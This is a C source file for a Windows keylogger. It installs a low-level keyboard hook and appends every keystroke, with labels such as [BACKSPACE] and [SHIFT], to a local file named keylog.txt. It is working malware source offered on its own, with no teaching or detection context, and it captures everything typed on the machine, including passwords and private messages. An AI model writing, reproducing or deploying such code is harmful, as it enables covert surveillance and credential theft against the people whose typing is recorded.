// keylogger.c
#include <windows.h>
#include <stdio.h>

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        FILE *fp = fopen("keylog.txt", "a");

        if (fp == NULL) {
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }

        DWORD vkCode = p->vkCode;

        // Handle alphabetic characters
        if (vkCode >= 'A' && vkCode <= 'Z') {
            vkCode += 'a' - 'A';  // Convert to lowercase
            fprintf(fp, "%c", (char)vkCode);
        }
        // Handle digits and common special keys
        else if ((vkCode >= '0' && vkCode <= '9') || (vkCode >= 'a' && vkCode <= 'z')) {
            fprintf(fp, "%c", (char)vkCode);
        } else {
            switch (vkCode) {
                case VK_SPACE: fprintf(fp, " "); break;
                case VK_RETURN: fprintf(fp, "\n"); break;
                case VK_BACK: fprintf(fp, "[BACKSPACE]"); break;
                case VK_TAB: fprintf(fp, "[TAB]"); break;
                case VK_SHIFT: fprintf(fp, "[SHIFT]"); break;
                case VK_CONTROL: fprintf(fp, "[CTRL]"); break;
                case VK_ESCAPE: fprintf(fp, "[ESC]"); break;
                case VK_LEFT: fprintf(fp, "[LEFT]"); break;
                case VK_RIGHT: fprintf(fp, "[RIGHT]"); break;
                case VK_UP: fprintf(fp, "[UP]"); break;
                case VK_DOWN: fprintf(fp, "[DOWN]"); break;
                case VK_F1: fprintf(fp, "[F1]"); break;
                case VK_F2: fprintf(fp, "[F2]"); break;
                // Add additional function keys as needed
                default:
                    fprintf(fp, "[%d]", vkCode); // Log the vkCode for unknown keys
                    break;
            }
        }

        fclose(fp);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (!hHook) {
        fprintf(stderr, "Failed to install hook!\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}
